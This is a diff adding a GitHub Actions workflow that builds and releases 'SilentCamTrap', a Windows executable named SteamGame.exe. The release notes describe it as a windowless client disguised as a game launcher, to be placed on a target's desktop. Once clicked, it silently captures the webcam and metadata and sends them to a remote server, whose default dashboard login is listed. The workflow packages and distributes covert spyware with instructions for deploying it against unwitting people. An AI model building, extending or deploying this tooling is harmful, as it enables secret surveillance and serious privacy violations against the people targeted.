@@ -1,0 +1,105 @@
+name: Build – Release Windows Executable
+
+on:
+  push:
+    tags:
+      - "v*"            # triggers on v1.0.0, v1.2.3, etc.
+  workflow_dispatch:    # allow manual trigger from GitHub UI
+
+permissions:
+  contents: write       # needed to create GitHub releases
+
+jobs:
+  build-windows:
+    name: Build Windows EXE
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Set up Python 3.11
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      - name: Install Python dependencies
+        working-directory: python
+        run: |
+          python -m pip install --upgrade pip
+          pip install -r requirements.txt
+
+      - name: Build with PyInstaller
+        working-directory: python
+        run: |
+          pyinstaller --clean silentcamtrap.spec
+          echo "Build complete. Listing dist:"
+          dir dist
+
+      - name: Verify executable exists
+        working-directory: python
+        run: |
+          if (!(Test-Path "dist\SteamGame.exe")) {
+            Write-Error "SteamGame.exe not found in dist/"
+            exit 1
+          }
+          $size = (Get-Item "dist\SteamGame.exe").length / 1MB
+          Write-Host "SteamGame.exe built successfully ($([math]::Round($size,1)) MB)"
+
+      - name: Package release artifact
+        working-directory: python
+        shell: pwsh
+        run: |
+          $tag = "${{ github.ref_name }}"
+          $dir = "SilentCamTrap-$tag-windows"
+          New-Item -ItemType Directory -Path $dir | Out-Null
+          Copy-Item "dist\SteamGame.exe" "$dir\"
+          Copy-Item "config.json"        "$dir\"
+          Copy-Item "game.ico"           "$dir\" -ErrorAction SilentlyContinue
+          # Include README snippet
+          @"
+          SilentCamTrap $tag
+          ===================
+          1. Edit config.json — set api_url and api_key to match your server.
+          2. Place SteamGame.exe on the target desktop with the game icon.
+          3. The server must be running and reachable at api_url.
+          "@ | Set-Content "$dir\README.txt"
+          Compress-Archive -Path "$dir\*" -DestinationPath "$dir.zip"
+          echo "ARTIFACT_NAME=$dir.zip" >> $env:GITHUB_ENV
+
+      - name: Upload artifact to workflow run
+        uses: actions/upload-artifact@v4
+        with:
+          name: SilentCamTrap-windows-${{ github.ref_name }}
+          path: python/SilentCamTrap-${{ github.ref_name }}-windows.zip
+          retention-days: 30
+
+      - name: Create GitHub Release
+        if: startsWith(github.ref, 'refs/tags/')
+        uses: softprops/action-gh-release@v2
+        with:
+          name: SilentCamTrap ${{ github.ref_name }}
+          body: |
+            ## SilentCamTrap ${{ github.ref_name }}
+
+            ### What's included
+            - `SteamGame.exe` — windowless Python client (disguised as a game launcher)
+            - `config.json` — configure `api_url` and `api_key` to match your server
+            - `README.txt` — quick deployment instructions
+
+            ### Server
+            Start the server with:
+            ```bash
+            cd server && npm start
+            # or on Windows:
+            server\start.bat
+            ```
+            Dashboard: http://localhost:3000 (login: admin / admin123 — **change in `.env`**)
+
+            ### Usage
+            1. Edit `config.json` with your server URL and API key
+            2. Place `SteamGame.exe` on the target desktop
+            3. The tool runs silently on click, captures webcam + metadata, and sends to server
+          files: python/SilentCamTrap-${{ github.ref_name }}-windows.zip
+          draft: false
+          prerelease: false
